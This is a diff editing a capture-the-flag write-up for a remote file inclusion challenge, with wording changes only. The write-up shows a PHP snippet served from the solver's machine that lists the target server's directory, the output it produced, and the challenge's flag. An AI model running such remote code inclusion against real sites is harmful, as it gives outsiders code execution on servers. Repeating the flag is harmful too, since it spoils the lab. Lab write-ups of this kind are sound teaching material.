@@ -2,7 +2,7 @@
 
 ## What it is
 
-Same as the other lfi, but we don't know what file the flag is in.
+Same as the others, but we don't know what file the flag is in.
 
 ## Solution
 
@@ -12,7 +12,7 @@ We can do that by executing code from a remote file ([source](https://www.php.ne
 
 ### Serving the remote file
 
-The remote code will print the files in the server's working directory:
+This code will be executed on the server and print the files in the server's current directory:
 ```php
 echo implode(", ", scandir("."))
 ```
@@ -24,7 +24,7 @@ python3 -m http.server 8080
 ```
 $ curl localhost:8080/remote.php 
 <?php
-        echo implode(", ", scandir("."))
+    echo implode(", ", scandir("."))
 ?>
 ```
 
@@ -45,7 +45,7 @@ This appears on the page:
 ., .., hidden_file.html, index.php 
 ```
 
-At https://remote.secu-web.blackfoot.dev/hidden_file.html we have:
+At https://remote.secu-web.blackfoot.dev/hidden_file.html we find:
 ```
 Congratz, you can validate with ZOB{sh0uld_h4v3_h1dd3n_b3773r}
 ```
